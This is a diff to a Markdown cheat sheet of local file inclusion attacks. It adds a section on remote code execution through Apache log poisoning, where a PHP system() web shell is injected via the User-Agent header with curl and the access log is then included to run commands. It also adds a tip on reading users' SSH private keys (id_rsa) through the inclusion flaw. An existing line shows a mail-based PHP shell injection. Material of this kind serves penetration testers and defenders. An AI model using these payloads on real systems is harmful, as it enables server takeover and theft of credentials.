@@ -35,6 +35,7 @@
 * [Kadimus - https://github.com/P0cL4bs/Kadimus](https://github.com/P0cL4bs/Kadimus)
 * [LFISuite - https://github.com/D35m0nd142/LFISuite](https://github.com/D35m0nd142/LFISuite)
 * [fimap - https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)
+* [panoptic - https://github.com/lightos/Panoptic](https://github.com/lightos/Panoptic)
 
 ## Basic LFI
 
@@ -344,6 +345,22 @@ In some cases you can also send the email with the `mail` command line.
 mail -s "<?php system($_GET['cmd']);?>" www-data@10.10.10.10. < /dev/null
 ```
 
+### RCE via Apache logs
+
+Poison the User-Agent in access logs:
+
+```
+$ curl http://example.org/ -A "<?php system(\$_GET['cmd']);?>"
+```
+
+Note: The logs will escape double quotes so use single quotes for strings in the PHP payload.
+
+Then request the logs via the LFI and execute your command.
+
+```
+$ curl http://example.org/test.php?page=/var/log/apache2/access.log&cmd=id
+```
+
 ## LFI to RCE via PHP sessions
 
 Check if the website use PHP Session (PHPSESSID)
@@ -397,6 +414,9 @@ http://example.com/index.php?page=../../../../../../etc/shadow
 
 Then crack the hashes inside in order to login via SSH on the machine.
 
+Another way to gain SSH access to a Linux machine through LFI is by reading the private key file, id_rsa.
+If SSH is active check which user is being used `/proc/self/status` and `/etc/passwd` and try to access `/<HOME>/.ssh/id_rsa`.
+
 ## References
 
 * [OWASP LFI](https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion)
@@ -413,3 +433,4 @@ Then crack the hashes inside in order to login via SSH on the machine.
 * [It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It, Sam Thomas](https://github.com/s-n-t/presentations/blob/master/us-18-Thomas-It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf)
 * [CVV #1: Local File Inclusion - @SI9INT - Jun 20, 2018](https://medium.com/bugbountywriteup/cvv-1-local-file-inclusion-ebc48e0e479a)
 * [Exploiting Remote File Inclusion (RFI) in PHP application and bypassing remote URL inclusion restriction](http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html?m=1)
+* [PHP LFI with Nginx Assistance](https://bierbaumer.net/security/php-lfi-with-nginx-assistance/)
